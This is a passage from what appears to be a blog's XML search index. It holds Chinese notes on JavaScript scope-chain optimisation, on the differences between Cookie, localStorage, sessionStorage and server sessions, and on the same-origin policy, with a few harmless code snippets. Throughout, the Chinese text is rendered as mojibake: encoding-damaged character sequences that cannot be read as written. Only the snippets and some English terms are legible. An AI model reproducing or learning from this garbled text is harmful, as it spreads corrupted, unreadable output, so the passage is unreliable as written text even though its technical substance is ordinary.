åœ¨å‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œæ²¡é‡åˆ°ä¸€ä¸ªå˜é‡ï¼Œéƒ½ä¼šç»åŽ†ä¸€æ¬¡æ ‡è¯†ç¬¦è§£æžè¿‡ç¨‹ä»¥å†³å®šä»Žå“ªé‡ŒèŽ·å–å’Œå­˜å‚¨æ•°æ®ã€‚è¯¥è¿‡ç¨‹ä»Žä½œç”¨åŸŸé“¾å¤´éƒ¨ï¼Œä¹Ÿå°±æ˜¯ä»Žæ´»åŠ¨å¯¹è±¡å¼€å§‹æœç´¢ï¼ŒæŸ¥æ‰¾åŒåçš„æ ‡è¯†ç¬¦ï¼Œå¦‚æžœæ‰¾åˆ°äº†å°±ä½¿ç”¨è¿™ä¸ªæ ‡è¯†ç¬¦å¯¹åº”çš„å˜é‡ï¼Œå¦‚æžœæ²¡æ‰¾åˆ°ç»§ç»­æœç´¢ä½œç”¨åŸŸé“¾ä¸­çš„ä¸‹ä¸€ä¸ªå¯¹è±¡ï¼Œå¦‚æžœæœç´¢å®Œæ‰€æœ‰å¯¹è±¡éƒ½æœªæ‰¾åˆ°ï¼Œåˆ™è®¤ä¸ºè¯¥æ ‡è¯†ç¬¦æœªå®šä¹‰ã€‚å‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œæ¯ä¸ªæ ‡è¯†ç¬¦éƒ½è¦ç»åŽ†è¿™æ ·çš„æœç´¢è¿‡ç¨‹ã€‚ å››ã€ä½œç”¨åŸŸé“¾å’Œä»£ç ä¼˜åŒ–ä»Žä½œç”¨åŸŸé“¾çš„ç»“æž„å¯ä»¥çœ‹å‡ºï¼Œåœ¨è¿è¡ŒæœŸä¸Šä¸‹æ–‡çš„ä½œç”¨åŸŸé“¾ä¸­ï¼Œæ ‡è¯†ç¬¦æ‰€åœ¨çš„ä½ç½®è¶Šæ·±ï¼Œè¯»å†™é€Ÿåº¦å°±ä¼šè¶Šæ…¢ã€‚å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå› ä¸ºå…¨å±€å˜é‡æ€»æ˜¯å­˜åœ¨äºŽè¿è¡ŒæœŸä¸Šä¸‹æ–‡ä½œç”¨åŸŸé“¾çš„æœ€æœ«ç«¯ï¼Œå› æ­¤åœ¨æ ‡è¯†ç¬¦è§£æžçš„æ—¶å€™ï¼ŒæŸ¥æ‰¾å…¨å±€å˜é‡æ˜¯æœ€æ…¢çš„ã€‚æ‰€ä»¥ï¼Œåœ¨ç¼–å†™ä»£ç çš„æ—¶å€™åº”å°½é‡å°‘ä½¿ç”¨å…¨å±€å˜é‡ï¼Œå°½å¯èƒ½ä½¿ç”¨å±€éƒ¨å˜é‡ã€‚ä¸€ä¸ªå¥½çš„ç»éªŒæ³•åˆ™æ˜¯ï¼šå¦‚æžœä¸€ä¸ªè·¨ä½œç”¨åŸŸçš„å¯¹è±¡è¢«å¼•ç”¨äº†ä¸€æ¬¡ä»¥ä¸Šï¼Œåˆ™å…ˆæŠŠå®ƒå­˜å‚¨åˆ°å±€éƒ¨å˜é‡é‡Œå†ä½¿ç”¨ ä¼˜åŒ–å‰ï¼š 12345function changeColor()&#123; document.getElementById("btnChange").onclick=function()&#123; document.getElementById("targetCanvas").style.backgroundColor="red"; &#125;;&#125; ä¼˜åŒ–åŽï¼š 123456function changeColor()&#123; var doc=document; doc.getElementById("btnChange").onclick=function()&#123; doc.getElementById("targetCanvas").style.backgroundColor="red"; &#125;;&#125;]]></content>
      <categories>
        <category>javaScriptç›¸å…³</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cookie LocalStorage sessionStorage]]></title>
    <url>%2F2018-05-13-saveStorage.html</url>
    <content type="text"><![CDATA[Cookie/LocalStorage/essionStorage ä¸€ã€æ•°æ®çš„ç”Ÿå‘½å‘¨æœŸCookie ä¸€èˆ¬ç”±æœåŠ¡å™¨ç”Ÿæˆï¼Œå¯è®¾ç½®å¤±æ•ˆæ—¶é—´ï¼Œå¦‚æžœåœ¨æµè§ˆå™¨ç«¯ç”ŸæˆCookieï¼Œé»˜è®¤æ˜¯å…³é—­æµè§ˆå™¨åŽå¤±æ•ˆLocalStorage é™¤éžè¢«æ¸…é™¤ï¼Œå¦åˆ™æ°¸è¿œä¿å­˜sessionStorage ä»…åœ¨å½“å‰ä¼šè¯ä¸‹æœ‰æ•ˆï¼Œå…³é—­é¡µé¢æˆ–æµè§ˆå™¨åŽè¢«æ¸…é™¤ äºŒã€å­˜æ”¾æ•°æ®å¤§å°Cookie 4K å·¦å³LocalStorage ä¸€èˆ¬ä¸º 5MBsessionStorage ä¸€èˆ¬ä¸º 5MB ä¸‰ã€ä¸ŽæœåŠ¡å™¨ç«¯é€šä¿¡Cookie æ¯æ¬¡éƒ½ä¼šæºå¸¦åœ¨HTTPå¤´ä¸­ï¼Œå¦‚æžœä½¿ç”¨Cookie ä¿å­˜è¿‡å¤šæ•°æ®ä¼šå¸¦æ¥æ€§é—®é¢˜LocalStorage sessionStorage ä»…åœ¨å®¢æˆ·ç«¯ï¼ˆæµè§ˆå™¨ï¼‰ä¸­ä¿å­˜ï¼Œä¸å‚ä¸Žå’ŒæœåŠ¡å™¨çš„é€šä¿¡ å››ã€æ˜“ç”¨æ€§Cookie éœ€è¦ç¨‹åºå‘˜è‡ªå·±å°è£…ï¼Œæºç”Ÿçš„CookieæŽ¥å£ä¸å‹å¥½LocalStorage sessionStorage æºç”ŸæŽ¥å£å¯ä»¥æŽ¥å—ï¼Œäº¦å¯å†æ¬¡å°è£…æ¥å¯¹Objectå’ŒArrayæœ‰æ›´å¥½çš„æ”¯æŒ LocalStorage/lobalStorage/sessionStorage/Cookie/Sessionâ–³1.Localstorage æ˜¯ html5å­˜å‚¨æ•°æ®çš„æ–¹å¼ï¼Œåœ¨HTML5ä¸­ï¼Œæœ¬åœ°å­˜å‚¨æ˜¯ä¸€ä¸ªwindowçš„å±žæ€§ï¼ŒåŒ…æ‹¬localStorageå’ŒsessionStorage.HTML5æœ¬åœ°å­˜å‚¨åªèƒ½å­˜å­—ç¬¦ä¸²ï¼Œä»»ä½•æ ¼å¼å­˜å‚¨çš„æ—¶å€™éƒ½ä¼šè¢«è‡ªåŠ¨è½¬ä¸ºå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¯»å–çš„æ—¶å€™ï¼Œéœ€è¦è‡ªå·±è¿›è¡Œç±»åž‹çš„è½¬æ¢ã€‚æ˜¯æ°¸ä¹…æ€§å­˜å‚¨ï¼Œå½“ç„¶ç”¨æˆ·å¯ä»¥é€šè¿‡æµè§ˆå™¨è®¾ç½®æ¥åˆ é™¤ 2.globalStorage ç›®çš„æ˜¯è·¨è¶Šä¼šè¯å­˜å‚¨æ•°æ®ï¼Œä¸è¿‡è¦æŒ‡å®šå“ªäº›åŸŸå¯ä»¥è®¿é—®è¯¥æ•°æ®ï¼Œå¦‚æžœä¸ä½¿ç”¨removeItemï¼ˆï¼‰æˆ–deleteåˆ é™¤ï¼Œæˆ–è€…ç”¨æˆ·æœªæ¸…é™¤æµè§ˆå™¨ç¼“å­˜ï¼Œå­˜å‚¨åœ¨globalStorageä¸Šçš„æ•°æ®ä¼šä¸€ç›´ä¿ç•™åœ¨ç£ç›˜ä¸Šï¼Œæ‰€ä»¥globalStorageéžå¸¸é€‚åˆåœ¨å®¢æˆ·ç«¯å­˜å‚¨æ–‡æ¡£æˆ–è€…é•¿æœŸä¿ç•™ç”¨æˆ·åå¥½è®¾ç½® 3.localStorageåœ¨HTML5ä¸­ä½œä¸ºä¿æŒå®¢æˆ·ç«¯æ•°æ®çš„æ–¹æ¡ˆå–ä»£globalStorageï¼Œå®ƒä¸èƒ½è¢«æŒ‡å®šè®¿é—®è§„åˆ™ï¼Œè¦è®¿é—®localStorageï¼Œé¡µé¢å¿…é¡»æ¥è‡ª åŒä¸€ä¸ªåŸŸåï¼Œä½¿ç”¨åŒä¸€ç§åè®®ï¼Œåœ¨åŒä¸€ä¸ªç«¯å£ä¸Šï¼Œå®ƒçš„æ•°æ®ä¹Ÿä¿ç•™åˆ°é€šè¿‡JavaScriptåˆ é™¤æˆ–ç”¨æˆ·æ¸…é™¤æµè§ˆå™¨ç¼“å­˜ 4.Cookie æ˜¯å­˜åœ¨æµè§ˆå™¨ç«¯ï¼Œæ¯æ¬¡æµè§ˆå™¨å‘é€è¯·æ±‚éƒ½ä¼šæºå¸¦cookieä¿¡æ¯ï¼Œå¦‚æžœæ˜¯ç¬¬ä¸€æ¬¡è¯·æ±‚çš„è¯å°±æ˜¯æ²¡æœ‰Cookieã€‚Cookieæ˜¯å¯ä»¥é€šè¿‡åŸŸåä¸‹é¢çš„é¡µé¢å…±äº«ï¼Œä¸åŒåŸŸåä¸‹é¢çš„Cookieä¸å…±äº«ã€‚çˆ¶çº§ç›®å½•ä¸‹é¢çš„cookieï¼Œå­ç›®å½•æ˜¯å¯ä»¥èŽ·å–åˆ°çš„ï¼Œä½†æ˜¯å­çº§ä¸Šçš„cookieï¼Œçˆ¶çº§èŽ·å–ä¸åˆ°ã€‚cookieæ˜¯æœ‰è¿‡åŽ»çš„æ—¶é—´çš„ï¼Œä¸€èˆ¬é»˜è®¤çš„å…³é—­æ—¶é—´æ˜¯é¡µé¢å…³é—­çš„æ—¶é—´ï¼Œæ—¶é—´æ˜¯å¯ä»¥è‡ªå·±è®¾ç½®çš„ã€‚cookieçš„æ ¼å¼æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ˜¯ä¸€ä¸ªé”®å€¼å¯¹çš„å½¢å¼ã€‚cookieæ˜¯æœ‰å¤§å°é™åˆ¶çš„ï¼Œä¸€èˆ¬æ˜¯4Kï¼Œå¦‚æžœæ•°æ®å¤ªå¤§çš„è¯ï¼Œä¼šå½±å“ä¼ é€’é€Ÿåº¦æˆ–æ˜¯æ•ˆçŽ‡ã€‚Document.cookieå¯ä»¥æ¥è®¾ç½®èŽ·å–cookieçš„ä¿¡æ¯ã€‚ 5.Session å­˜å‚¨äºŽæœåŠ¡ç«¯ï¼Œä¾èµ–äºŽcookieï¼ŒæœåŠ¡ç«¯ç›¸å½“äºŽæœ‰ä¸€ä¸ªsessionå­˜å‚¨åŒºï¼Œæ²¡æœ‰å¤§å°çš„é™åˆ¶ Webå­˜å‚¨ï¼ˆlocalStorageä¸ŽsessionStorageï¼‰ç›®çš„ï¼šè®©å®¢æˆ·ç«¯å¯ä»¥å­˜å‚¨æ•°æ®ã€‚åŒºåˆ«ï¼š localStorage é™¤éžäººä¸ºåœ°åˆ é™¤ï¼Œå¦åˆ™å­˜å‚¨çš„æ•°æ®å°†è¢«ç”¨ä¹…ä¿å­˜ä¸‹æ¥ sessionStorage å­˜å‚¨çš„æ•°æ®ä»…åœ¨æµè§ˆå™¨çš„ä¸€æ¬¡ä¼šè¯ä¸­æœ‰æ•ˆï¼Œå½“ç»“æŸä¼šè¯æ—¶ï¼Œæ•°æ®è¢«è¯·é™¤ã€‚ ä»¥localStorageä¸ºä¾‹ï¼š 123456if(window.localStorage)&#123; console.log("æ”¯æŒwebå­˜å‚¨æ ‡å‡†");&#125;else&#123; console.log("ä¸æ”¯æŒwebå­˜å‚¨æ ‡å‡†");&#125; æ–¹æ³•ä¸Žå±žæ€§ï¼š setItem(&#39;key&#39;,&#39;data&#39;)é€šè¿‡è¯¥æ–¹æ³•å¯¹æ•°æ®è¿›è¡Œå­˜å‚¨ï¼Œå®ƒæŽ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œé”®åã€è¦å­˜å‚¨çš„æ•°æ®ã€‚ localStorage.setItem(â€˜keyâ€™,â€™dataâ€™);sessionStorage.setItem(â€˜keyâ€™,â€™dataâ€™); getItem() é€šè¿‡è¯¥æ–¹æ³•èŽ·å–ä»¥åŠå­˜å‚¨çš„æ•°æ®ï¼Œå®ƒæŽ¥å—ä¸€ä¸ªå‚æ•°ï¼Œå¯¹ç”¨çš„é”®å localStorage.getItem(â€˜keyâ€™);sessionStorage.getItem(â€˜keyâ€™); removeItem() é€šè¿‡è¯¥æ–¹æ³•åˆ é™¤æŸæ¡å·²ç»å­˜å‚¨çš„æ•°æ®ï¼Œå®ƒæŽ¥å—ä¸€ä¸ªå‚æ•°ï¼šå¯¹ç”¨çš„é”®å localStorage.removeItem(â€˜keyâ€™);sessionStorage.removeItem(â€˜keyâ€™); clear() é€šè¿‡è¯¥æ–¹æ³•å¯ä»¥æ¸…é™¤æ‰€æœ‰å·²ç»å­˜å‚¨çš„æ•°æ® localStorage.clear();sessionStorage.clear(); key() é€šè¿‡è¯¥æ–¹æ³•å¯ä»¥èŽ·å¾—å·²å­˜å‚¨çš„æ•°æ®çš„é”®åï¼Œå®ƒæŽ¥å—ä¸€ä¸ªå‚æ•°ï¼Œæ•°å€¼ç´¢å¼•ï¼Œä¸Žè¯¥æ•°ç»„ç›¸ä¼¼ï¼Œè¯¥ç´¢å¼•ä»Žä¸‹æ ‡ä¸º0å¼€å§‹ localStorage.key(2);sessionStorage.key(2); length å”¯ä¸€çš„å±žæ€§ï¼Œç”¨è¿‡è¯¥å±žæ€§å¯ä»¥å¾—çŸ¥å·²å­˜å‚¨çš„æ•°æ®æ•°é‡ localStorage.length ();sessionStorage.length (); Cookie/session/localStorageçš„åŒºåˆ« cookieçš„å†…å®¹ä¸»è¦åŒ…æ‹¬ï¼šåå­—ã€å€¼ã€è¿‡æœŸæ—¶é—´ã€è·¯å¾„å’ŒåŸŸã€‚è·¯å¾„ä¸ŽåŸŸä¸€èµ·æž„æˆcookieçš„ä½œç”¨èŒƒå›´ã€‚è‹¥ä¸è®¾ç½®æ—¶é—´ï¼Œåˆ™è¡¨ç¤ºè¿™ä¸ªcookieçš„ç”Ÿå‘½æœŸä¸ºæµè§ˆå™¨ä¼šè¯æœŸé—´ï¼Œå…³é—­æµè§ˆå™¨çª—å£ï¼Œcookieå°±ä¼šæ¶ˆå¤±ã€‚è¿™ç§ç”Ÿå‘½æœŸä¸ºæµè§ˆå™¨ä¼šè¯æœŸçš„cookieè¢«ç§°ä¸ºä¼šè¯cookieã€‚ä¼šè¯cookieä¸€èˆ¬ä¸å­˜å‚¨åœ¨ç¡¬ç›˜è€Œæ˜¯ä¿å­˜åœ¨å†…å­˜é‡Œï¼Œå½“ç„¶è¿™ä¸ªè¡Œä¸ºå¹¶ä¸æ˜¯è§„èŒƒè§„å®šçš„ã€‚è‹¥è®¾ç½®äº†è¿‡æœŸæ—¶é—´ï¼Œæµè§ˆå™¨å°±ä¼šæŠŠcookieä¿å­˜åˆ°ç¡¬ç›˜ä¸Šï¼Œå…³é—­åŽå†æ‰“å¼€æµè§ˆå™¨è¿™äº›cookieä»ç„¶æœ‰æ•ˆç›´åˆ°è¶…è¿‡è®¾å®šçš„è¿‡æœŸæ—¶é—´ã€‚å¯¹äºŽä¿å­˜åœ¨å†…å­˜é‡Œçš„cookieï¼Œä¸åŒçš„æµè§ˆå™¨æœ‰ä¸åŒçš„å¤„ç†æ–¹å¼sessionæœºåˆ¶ã€‚å½“ç¨‹åºéœ€è¦ä¸ºæŸä¸ªå®¢æˆ·ç«¯çš„è¯·æ±‚åˆ›å»ºä¸€ä¸ªsessionæ—¶ï¼ŒæœåŠ¡å™¨é¦–å…ˆæ£€æŸ¥è¿™ä¸ªå®¢æˆ·ç«¯çš„è¯·æ±‚é‡Œæ˜¯å¦å·²åŒ…å«äº†ä¸€ä¸ªsessionæ ‡è¯†ï¼ˆç§°ä¸ºsession idï¼‰ï¼Œå¦‚æžœå·²åŒ…å«åˆ™è¯´æ˜Žä»¥å‰å·²ç»ä¸ºæ­¤å®¢æˆ·ç«¯åˆ›å»ºè¿‡sessionï¼ŒæœåŠ¡å™¨å°±æŒ‰ç…§session idæŠŠè¿™ä¸ªsessionæ£€ç´¢å‡ºæ¥ä½¿ç”¨ï¼ˆæ£€ç´¢ä¸åˆ°ï¼Œä¼šæ–°å»ºä¸€ä¸ªï¼‰ï¼Œå¦‚æžœå®¢æˆ·ç«¯è¯·æ±‚ä¸åŒ…å«session idï¼Œåˆ™ä¸ºå®¢æˆ·ç«¯åˆ›å»ºä¸€ä¸ªsessionå¹¶ä¸”ç”Ÿæˆä¸€ä¸ªä¸Žæ­¤sessionç›¸å…³è”çš„session idï¼Œsession idçš„å€¼åº”è¯¥æ˜¯ä¸€ä¸ªæ—¢ä¸ä¼šé‡å¤ï¼Œåˆä¸å®¹æ˜“è¢«æ‰¾åˆ°è§„å¾‹ä»¥ä»¿é€ çš„å­—ç¬¦ä¸²ï¼Œè¿™ä¸ªsession idå°†è¢«åœ¨æœ¬æ¬¡å“åº”ä¸­è¿”å›žç»™å®¢æˆ·ç«¯ä¿å­˜ã€‚ä¿å­˜è¿™ä¸ªsession idçš„æ–¹å¼å¯ä»¥é‡‡ç”¨cookieï¼Œè¿™æ ·åœ¨äº¤äº’è¿‡ç¨‹ä¸­æµè§ˆå™¨å¯ä»¥è‡ªåŠ¨çš„æŒ‰ç…§è§„åˆ™æŠŠè¿™ä¸ªæ ‡è¯†å‘é€ç»™æœåŠ¡å™¨ã€‚ cookie/sessionçš„åŒºåˆ«ï¼š1ã€cookieæ•°æ®å­˜æ”¾åœ¨å®¢æˆ·çš„æµè§ˆå™¨ä¸Šï¼Œsessionæ•°æ®æ”¾åœ¨æœåŠ¡å™¨ä¸Š2ã€cookieä¸æ˜¯å¾ˆå®‰å…¨ï¼Œåˆ«äººå¯ä»¥åˆ†æžå­˜æ”¾åœ¨æœ¬åœ°çš„cookieå¹¶è¿›è¡Œcookieæ¬ºéª—ï¼Œè€ƒè™‘åˆ°å®‰å…¨åº”å½“ä½¿ç”¨session3ã€sessionä¼šåœ¨ä¸€å®šæ—¶é—´å†…ä¿å­˜åœ¨æœåŠ¡å™¨ä¸Šï¼Œå½“è®¿é—®å¢žå¤šï¼Œä¼šæ¯”è¾ƒå ç”¨ä½ æœåŠ¡å™¨çš„æ€§èƒ½ï¼Œè€ƒè™‘åˆ°å‡è½»æœåŠ¡å™¨æ€§èƒ½æ–¹é¢ï¼Œåº”å½“ä½¿ç”¨cookie4ã€å•ä¸ªcookieä¿å­˜çš„æ•°æ®ä¸èƒ½è¶…è¿‡4Kï¼Œå¾ˆå¤šæµè§ˆå™¨éƒ½é™åˆ¶ä¸€ä¸ªç«™ç‚¹æœ€å¤šä¿å­˜20ä¸ªcookie5ã€å»ºè®®å°†ç™»å½•ä¿¡æ¯ç­‰é‡è¦ä¿¡æ¯å­˜æ”¾ä¸ºsessionï¼Œå…¶ä»–ä¿¡æ¯å¦‚æžœéœ€è¦ä¿ç•™ï¼Œå¯ä»¥æ”¾åœ¨cookieä¸­6ã€sessionä¿å­˜åœ¨æœåŠ¡å™¨ï¼Œå®¢æˆ·ç«¯ä¸çŸ¥é“å…¶ä¸­çš„ä¿¡æ¯ï¼›cookieä¿å­˜åœ¨å®¢æˆ·ç«¯ï¼ŒæœåŠ¡å™¨èƒ½å¤ŸçŸ¥é“å…¶ä¸­çš„ä¿¡æ¯7ã€sessionä¸­ä¿å­˜çš„æ˜¯å¯¹è±¡ï¼Œcookieä¸­ä¿å­˜çš„æ˜¯å­—ç¬¦ä¸²8ã€sessionä¸èƒ½åŒºåˆ†è·¯å¾„ï¼ŒåŒä¸€ä¸ªç”¨æˆ·åœ¨è®¿é—®ä¸€ä¸ªç½‘ç«™æœŸé—´ï¼Œæ‰€æœ‰çš„sessionåœ¨ä»»ä½•ä¸€ä¸ªåœ°æ–¹éƒ½å¯ä»¥è®¿é—®åˆ°ï¼Œè€Œcookieä¸­å¦‚æžœè®¾ç½®äº†è·¯å¾„å‚æ•°ï¼Œé‚£ä¹ˆåŒä¸€ä¸ªç½‘ç«™ä¸­ä¸åŒè·¯å¾„ä¸‹çš„cookieäº’ç›¸æ˜¯è®¿é—®ä¸åˆ°çš„ æµè§ˆå™¨æœ¬åœ°å­˜å‚¨ä¸ŽæœåŠ¡å™¨ç«¯å­˜å‚¨çš„åŒºåˆ« å…¶å®žæ•°æ®æ—¢å¯ä»¥åœ¨æµè§ˆå™¨æœ¬åœ°å­˜å‚¨ï¼Œä¹Ÿå¯ä»¥åœ¨æœåŠ¡å™¨ç«¯å­˜å‚¨æµè§ˆå™¨å¯ä»¥ä¿å­˜ä¸€äº›æ•°æ®ï¼Œéœ€è¦çš„æ—¶å€™ç›´æŽ¥ä»Žæœ¬åœ°å­˜å–ï¼ŒsessionStorageã€localStorageå’Œcookieéƒ½æ˜¯ç”±æµè§ˆå™¨å­˜å‚¨åœ¨æœ¬åœ°çš„æ•°æ®æœåŠ¡å™¨ç«¯ä¹Ÿå¯ä»¥ä¿å­˜æ‰€æœ‰ç”¨æˆ·çš„æ‰€æœ‰æ•°æ®ï¼Œä½†éœ€è¦çš„æ—¶å€™æµè§ˆå™¨è¦å‘æœåŠ¡å™¨è¯·æ±‚æ•°æ®ã€‚1ã€æœåŠ¡å™¨ç«¯å¯ä»¥ä¿å­˜ç”¨æˆ·çš„æŒä¹…æ•°æ®ï¼Œå¦‚æ•°æ®åº“å’Œäº‘å­˜å‚¨å°†ç”¨æˆ·çš„å¤§é‡æ•°æ®ä¿å­˜åœ¨æœåŠ¡å™¨ç«¯2ã€æœåŠ¡å™¨ç«¯ä¹Ÿå¯ä»¥ä¿å­˜ç”¨æˆ·çš„ä¸´æ—¶ä¼šè¯æ•°æ®ï¼ŒæœåŠ¡å™¨ç«¯çš„sessionæœºåˆ¶ï¼Œå¦‚jspçš„sessionå¯¹è±¡ï¼Œæ•°æ®ä¿å­˜åœ¨æœåŠ¡å™¨ä¸Š å®žé™…ä¸Šï¼ŒæœåŠ¡å™¨å’Œæµè§ˆå™¨ä¹‹é—´ä»…éœ€ä¼ é€’session idå³å¯ï¼ŒæœåŠ¡å™¨æ ¹æ®session idæ‰¾åˆ°å¯¹åº”ç”¨æˆ·çš„sessionå¯¹è±¡ï¼Œä¼šè¯æ•°æ®ä»…åœ¨ä¸€æ®µæ—¶é—´å†…æœ‰æ•ˆï¼Œè¿™ä¸ªæ—¶é—´å°±æ˜¯serverç«¯è®¾ç½®çš„sessionæœ‰æ•ˆæœŸ æœåŠ¡å™¨ç«¯ä¿å­˜æ‰€æœ‰çš„ç”¨æˆ·çš„æ•°æ®ï¼Œæ‰€ä»¥æœåŠ¡å™¨ç«¯çš„å¼€é”€è¾ƒå¤§ï¼Œè€Œæµè§ˆå™¨ç«¯ä¿å­˜åˆ™æŠŠä¸åŒç”¨æˆ·éœ€è¦çš„æ•°æ®åˆ†åˆ«ä¿å­˜åœ¨ç”¨æˆ·å„è‡ªçš„æµè§ˆå™¨ä¸­ï¼Œæµè§ˆå™¨ç«¯ä¸€èˆ¬åªç”¨æ¥å­˜å‚¨å°æ•°æ®ï¼Œè€ŒéžæœåŠ¡å¯ä»¥å­˜å‚¨å¤§æ•°æ®æˆ–å°æ•°æ®æœåŠ¡å™¨å­˜å‚¨æ•°æ®å®‰å…¨ä¸€äº›ï¼Œæµè§ˆå™¨åªé€‚åˆå­˜å‚¨ä¸€èˆ¬æ•°æ® sessionStorage/localStorage/cookieçš„åŒºåˆ« å…±åŒç‚¹ï¼šéƒ½æ˜¯ä¿å­˜åœ¨æµè§ˆå™¨ç«¯ã€ä¸”åŒæºçš„åŒºåˆ«ï¼š1ã€cookieæ•°æ®å§‹ç»ˆåœ¨åŒæºçš„httpè¯·æ±‚ä¸­æºå¸¦ï¼ˆå³ä½¿ä¸éœ€è¦ï¼‰ï¼Œå³ cookieåœ¨æµè§ˆå™¨å’ŒæœåŠ¡å™¨é—´æ¥å›žä¼ é€’ï¼Œè€ŒsessionStorageå’ŒlocalStorageä¸ä¼šè‡ªåŠ¨æŠŠæ•°æ®å‘é€ç»™æœåŠ¡å™¨ï¼Œä»…åœ¨æœ¬åœ°ä¿å­˜ã€‚cookieæ•°æ®è¿˜æœ‰è·¯å¾„ path çš„æ¦‚å¿µï¼Œå¯ä»¥é™åˆ¶cookieåªå±žäºŽæŸä¸ªè·¯å¾„ä¸‹2ã€å­˜å‚¨å¤§å°é™åˆ¶ä¹Ÿä¸åŒï¼Œcookieæ•°æ®ä¸èƒ½è¶…è¿‡4Kï¼ŒåŒæ—¶å› ä¸ºæ¯æ¬¡httpè¯·æ±‚éƒ½ä¼šæºå¸¦cookieã€æ‰€ä»¥cookieåªé€‚åˆä¿å­˜å¾ˆå°çš„æ•°æ®ï¼Œå¦‚ä¼šè¯æ ‡è¯†ã€‚sessionStorageå’ŒlocalStorageè™½ç„¶ä¹Ÿæœ‰å­˜å‚¨å¤§å°çš„é™åˆ¶ï¼Œä½†æ¯”cookieå¤§å¾—å¤šï¼Œå¯ä»¥è¾¾åˆ°5Mæˆ–æ›´å¤§3ã€æ•°æ®æœ‰æ•ˆæœŸä¸åŒsessionStorageï¼šä»…åœ¨å½“å‰æµè§ˆå™¨çª—å£å…³é—­ä¹‹å‰æœ‰æ•ˆlocalStorageï¼šå§‹ç»ˆæœ‰æ•ˆï¼Œçª—å£æˆ–æµè§ˆå™¨å…³é—­ä¹Ÿä¸€ç›´ä¿å­˜ï¼Œå› æ­¤ç”¨ä½œæŒä¹…æ•°æ®cookieï¼šåªåœ¨è®¾ç½®çš„cookieè¿‡æœŸæ—¶é—´ä¹‹å‰æœ‰æ•ˆï¼Œå³ä½¿çª—å£å…³é—­æˆ–æµè§ˆå™¨å…³é—­4ã€ä½œç”¨åŸŸä¸åŒsessionStorageä¸åœ¨ä¸åŒçš„æµè§ˆå™¨çª—å£ä¸­å…±äº«å³ä½¿æ˜¯åŒä¸€ä¸ªé¡µé¢localstorageåœ¨æ‰€æœ‰åŒæºçª—å£ä¸­éƒ½æ˜¯å…±äº«çš„cookieä¹Ÿæ˜¯åœ¨æ‰€æœ‰åŒæºçª—å£ä¸­éƒ½æ˜¯å…±äº«çš„5ã€web Storageæ”¯æŒäº‹ä»¶é€šçŸ¥æœºåˆ¶ï¼Œå¯ä»¥å°†æ•°æ®æ›´æ–°çš„é€šçŸ¥å‘é€ç»™ç›‘å¬è€…6ã€web Storageçš„apiæŽ¥å£ä½¿ç”¨æ›´æ–¹ä¾¿ sessionStorageä¸Žé¡µé¢jsæ•°æ®å¯¹è±¡çš„åŒºåˆ« é¡µé¢ä¸­ä¸€èˆ¬çš„jså¯¹è±¡çš„ç”Ÿå­˜æœŸä»…åœ¨å½“å‰é¡µé¢æœ‰æ•ˆï¼Œå› æ­¤åˆ·æ–°é¡µé¢æˆ–è½¬åˆ°å¦ä¸€é¡µé¢è¿™æ ·çš„é‡æ–°åŠ è½½é¡µé¢çš„æƒ…å†µï¼Œæ•°æ®å°±ä¸å­˜åœ¨äº†è€ŒsessionStorageåªè¦åŒæºçš„åŒçª—å£ä¸­ï¼Œåˆ·æ–°é¡µé¢æˆ–è¿›å…¥åŒæºçš„ä¸åŒé¡µé¢ï¼Œæ•°æ®å§‹ç»ˆå­˜åœ¨ï¼Œä¹Ÿå°±æ˜¯è¯´åªè¦æµè§ˆå™¨ä¸å…³é—­ï¼Œæ•°æ®ä»ç„¶å­˜åœ¨]]></content>
      <categories>
        <category>æµè§ˆå™¨ç¼“å­˜</category>
      </categories>
      <tags>
        <tag>æµè§ˆå™¨ç¼“å­˜</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[åŒæºç­–ç•¥]]></title>
    <url>%2F2018-05-13-same-origin-policy.html</url>
    <content type="text"><![CDATA[åŒæºç­–ç•¥å«ä¹‰æ˜¯ä¸€ç§çº¦å®šï¼Œæ˜¯æµè§ˆå™¨æœ€æ ¸å¿ƒä¹Ÿæ˜¯æœ€åŸºæœ¬çš„å®‰å…¨åŠŸèƒ½ï¼Œå¦‚æžœç¼ºå°‘äº†åŒæºç­–ç•¥ï¼Œåˆ™æµè§ˆå™¨çš„æ­£å¸¸åŠŸèƒ½éƒ½ä¼šå—åˆ°å½±å“ï¼Œå¯ä»¥è¯´webæ˜¯æž„å»ºåœ¨åŒæºç­–ç•¥åŸºç¡€ä¹‹ä¸Šï¼Œæµè§ˆå™¨åªæ˜¯é’ˆå¯¹åŒæºç­–ç•¥çš„ä¸€ç§å®žçŽ°ã€‚æ‰€è°“çš„åŒæºæŒ‡çš„æ˜¯åŸŸåã€åè®®ã€ç«¯å£ç›¸åŒã€‚ è¿™ä¹Ÿæ˜¯ç‹­ä¹‰çš„è·¨åŸŸï¼Œè·¨åŸŸæŒ‡çš„æ˜¯ä¸€ä¸ªåŸŸä¸‹çš„æ–‡æ¡£æˆ–è€…è„šæœ¬è¯•å›¾åŽ»è¯·æ±‚å¦ä¸€ä¸ªåŸŸä¸‹çš„èµ„æºã€‚å¦å¤–å¹¿ä¹‰çš„è·¨åŸŸï¼š èµ„æºè·³è½¬ï¼šAé“¾æŽ¥ã€é‡å®šå‘ã€è¡¨å•æäº¤ èµ„æºåµŒå…¥ï¼šlink/script/img/frameç­‰ dom æ ‡ç­¾ï¼Œæ ·å¼ä¸­çš„ background:url()/@font-face()ç­‰æ–‡ä»¶å¤–é“¾ è„šæœ¬è¯·æ±‚ï¼šjs å‘èµ·çš„ ajax è¯·æ±‚ï¼Œdom å’Œ js å¯¹è±¡çš„è·¨åŸŸæ“ä½œç­‰ 